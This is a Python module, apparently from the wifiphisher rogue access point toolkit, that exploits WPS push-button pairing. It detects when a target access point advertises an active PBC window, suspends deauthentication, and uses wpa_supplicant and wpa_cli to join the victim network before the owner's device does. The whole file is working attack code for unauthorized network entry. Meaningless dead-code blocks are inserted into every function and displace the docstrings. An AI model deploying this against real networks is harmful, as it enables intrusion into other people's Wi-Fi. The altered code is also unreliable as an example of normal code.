"""
Extension that sniffs if there is change for WPS PBC exploitation

Define three WPS states

1) WPS_IDLE: Wait for target AP bringing WPSPBC IE in the beacon
2) WPS_CONNECTING: If users specify the WPS association interface
   we can start using wpa_supplicant/wpa_cli to connect to the AP
3) WPS_CONNECTED: We have connected to the AP
"""
import logging
import os
import signal
import subprocess
import time
from collections import defaultdict
from threading import Timer
import scapy.layers.dot11 as dot11
import wifiphisher.common.extensions as extensions
logger = logging.getLogger(__name__)
(WPS_IDLE, WPS_CONNECTING, WPS_CONNECTED) = list(range(3))
WAIT_CNT = 3
WPS_2_STR = {WPS_IDLE: 'WPS_IDLE', WPS_CONNECTING: 'WPS_CONNECTING', WPS_CONNECTED: 'WPS_CONNECTED'}

def kill_wpa_supplicant():
    if False:
        while True:
            i = 10
    '\n    Kill the wpa_supplicant\n    :return: None\n    :rtype: None\n    '
    proc = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
    output = proc.communicate()[0]
    sys_procs = output.splitlines()
    for proc in sys_procs:
        if 'wpa_supplicant' in proc:
            pid = int(proc.split(None, 1)[0])
            os.kill(pid, signal.SIGKILL)

class Wpspbc(object):
    """
    Handle the wps exploitation process
    """

    def __init__(self, data):
        if False:
            print('Hello World!')
        '\n        Setup the class with all the given arguments.\n\n        :param self: A Wpspbc object\n        :param data: Shared data from main engine\n        :type self: Deauth\n        :type data: tuple\n        :return: None\n        :rtype: None\n        '
        self._data = data
        self._packets_to_send = defaultdict(list)
        self._wps_state = WPS_IDLE
        self._is_supplicant_running = False
        self._wps_timer = Timer(120.0, self.wps_timeout_handler)

    def wps_timeout_handler(self):
        if False:
            for i in range(10):
                print('nop')
        '\n        Handle if state is not in CONNECTED after the 2MIN walk time\n        :param self: A Wpspbc object\n        :type self: Wpspbc\n        :return: None\n        :rtype: None\n        '
        if self.get_wps_state() != WPS_CONNECTED:
            self.set_wps_state(WPS_IDLE)
            extensions.is_deauth_cont = True
            if self._is_supplicant_running:
                kill_wpa_supplicant()
                self._is_supplicant_running = False

    @staticmethod
    def does_have_wpspbc_ie(packet):
        if False:
            return 10
        '\n        Check if the pbc button is being pressed\n        :param self: A Wpspbc object\n        :param packet: A scapy.layers.RadioTap object\n        :type self: Wpspbc\n        :type packet: scapy.layers.RadioTap\n        :return: None\n        :rtype: None\n        '
        elt_section = packet[dot11.Dot11Elt]
        while isinstance(elt_section, dot11.Dot11Elt):
            if elt_section.ID == 221 and elt_section.info.startswith('\x00Pò\x04'):
                wps_ie_array = [ord(val) for val in elt_section.info[4:]]
                pos = 0
                while pos < len(wps_ie_array):
                    if wps_ie_array[pos] == 16 and wps_ie_array[pos + 1] == 18:
                        return True
                    else:
                        data_len = (wps_ie_array[pos + 2] << 8) + wps_ie_array[pos + 3]
                        pos += 2 + 2 + data_len
                break
            elt_section = elt_section.payload
        return False

    def get_wps_state(self):
        if False:
            print('Hello World!')
        '\n        Get the current wps state\n\n        :param self: A Wpspbc object\n        :type self: Wpspbc\n        :return: An intger represented the WPS state\n        :rtype: int\n        '
        return self._wps_state

    def set_wps_state(self, new_state):
        if False:
            while True:
                i = 10
        '\n        Set the wps state\n        :param self: A Wpspbc object\n        :type self: Wpspbc\n        :return: None\n        :rtype: None\n        '
        logger.info('wps state is transiting from %s to %s', WPS_2_STR[self.get_wps_state()], WPS_2_STR[new_state])
        self._wps_state = new_state

    def is_associated(self):
        if False:
            while True:
                i = 10
        '\n        Using wpa_cli to check if the wps interface is getting associated\n        :param self: A Wpspbc object\n        :type self: Wpspbc\n        :return: True if the interface is connected else False\n        :rtype: bool\n        '
        proc = subprocess.Popen(['wpa_cli', 'status'], stdout=subprocess.PIPE)
        output = proc.communicate()[0]
        if 'COMPLETED' in output and self._data.rogue_ap_mac not in output:
            return True
        return False

    def wps_associate(self):
        if False:
            for i in range(10):
                print('nop')
        '\n        Using wpa_supplicant and wpa_cli to associate to the target\n        WPS Access Point\n        :param self: A Wpspbc object\n        :type self: Wpspbc\n        :return: None\n        :rtype: None\n        '
        if not self._is_supplicant_running:
            self._is_supplicant_running = True
            with open('/tmp/wpa_supplicant.conf', 'w') as conf:
                conf.write('ctrl_interface=/var/run/wpa_supplicant\n')
            try:
                proc = subprocess.Popen(['wpa_supplicant', '-i' + self._data.args.wpspbc_assoc_interface, '-Dnl80211', '-c/tmp/wpa_supplicant.conf'], stdout=subprocess.PIPE)
                time.sleep(2)
                if proc.poll() is not None:
                    logger.error('supplicant lunches fail!!')
                proc = subprocess.Popen(['wpa_cli', 'wps_pbc'], stdout=subprocess.PIPE)
                output = proc.communicate()[0]
                if 'OK' not in output:
                    logger.error('CONFIG_WPS should be ENABLED when compile wpa_supplicant!!')
                    kill_wpa_supplicant()
                else:
                    logger.info('Start using wpa_supplicant to connect to WPS AccessPoint')
                    self._wps_timer = Timer(120.0, self.wps_timeout_handler)
                    self._wps_timer.start()
            except OSError:
                logger.error('wpa_supplicant or wpa_cli are not installed!')

    def wps_state_handler(self, packet):
        if False:
            print('Hello World!')
        '\n        Handler for wps state transition\n        :param self: A Wpspbc object\n        :param packet: A scapy.layers.RadioTap object\n        :type self: Wpspbc\n        :type packet: scapy.layers.RadioTap\n        :return: None\n        :rtype: None\n        '
        if packet.haslayer(dot11.Dot11Beacon) and packet.addr3 == self._data.target_ap_bssid:
            has_pbc = self.does_have_wpspbc_ie(packet)
            if self.get_wps_state() == WPS_IDLE:
                if has_pbc:
                    extensions.is_deauth_cont = False
                    self.set_wps_state(WPS_CONNECTING)
            elif self.get_wps_state() == WPS_CONNECTING:
                if not has_pbc and (not self._wps_timer.is_alive()):
                    self.set_wps_state(WPS_IDLE)
                    extensions.is_deauth_cont = True
                elif self._data.args.wpspbc_assoc_interface:
                    self.wps_associate()
        if self._is_supplicant_running:
            is_assoc = self.is_associated()
            if not is_assoc and (not self._wps_timer.is_alive()):
                self.set_wps_state(WPS_IDLE)
                extensions.is_deauth_cont = True
                self._is_supplicant_running = False
                kill_wpa_supplicant()
            elif self.get_wps_state() == WPS_CONNECTING:
                if is_assoc:
                    self.set_wps_state(WPS_CONNECTED)
                    if self._wps_timer.is_alive():
                        self._wps_timer.cancel()

    def get_packet(self, packet):
        if False:
            while True:
                i = 10
        '\n        Process the Dot11 packets\n\n        :param self: A Wpspbc object\n        :param packet: A scapy.layers.RadioTap object\n        :type self: Deauth\n        :type packet: scapy.layers.RadioTap\n        :return: A tuple with channel list followed by packets list\n        :rtype: tuple\n        '
        try:
            bssid = packet.addr3
        except AttributeError:
            logger.debug("Malformed frame doesn't contain address fields")
            return self._packets_to_send
        self.wps_state_handler(packet)
        return self._packets_to_send

    def send_output(self):
        if False:
            return 10
        '\n        Get any relevant output message\n\n        :param self: A Wpspbc object\n        :type self: Wpspbc\n        :return: A list with all the message entries\n        :rtype: list\n        '
        if self.get_wps_state() == WPS_CONNECTED:
            return ['WPS PBC CONNECTED!']
        elif self.get_wps_state() == WPS_CONNECTING:
            return ['WPS PBC button is being pressed for the target AP!']
        return ['']

    def send_channels(self):
        if False:
            while True:
                i = 10
        '\n        Send channes to subscribe\n\n        :param self: A Wpspbc object\n        :type self: Wpspbc\n        :return: A list with all interested channels\n        :rtype: list\n        '
        return [self._data.target_ap_channel]

    @extensions.register_backend_funcs
    def get_wps_state_handler(self, *list_data):
        if False:
            i = 10
            return i + 15
        '\n        Backend method for getting the WPS state\n\n        :param self: A Wpspbc object\n        :type self: Wpspbc\n        :return: A string representing the WPS state\n        :rtype: string\n        '
        cnt = 0
        while cnt < WAIT_CNT:
            if self._wps_state != WPS_IDLE:
                return WPS_2_STR[self._wps_state]
            cnt += 1
            time.sleep(1)
        return WPS_2_STR[self._wps_state]

    def on_exit(self):
        if False:
            while True:
                i = 10
        '\n        Free all the resources regarding to this module\n        :param self: A Wpspbc object\n        :type self: Wpspbc\n        :return: None\n        :rtype: None\n        '
        self.set_wps_state(WPS_IDLE)
        if os.path.isfile('/tmp/wpa_supplicant.conf'):
            os.remove('/tmp/wpa_supplicant.conf')
        if self._is_supplicant_running:
            kill_wpa_supplicant()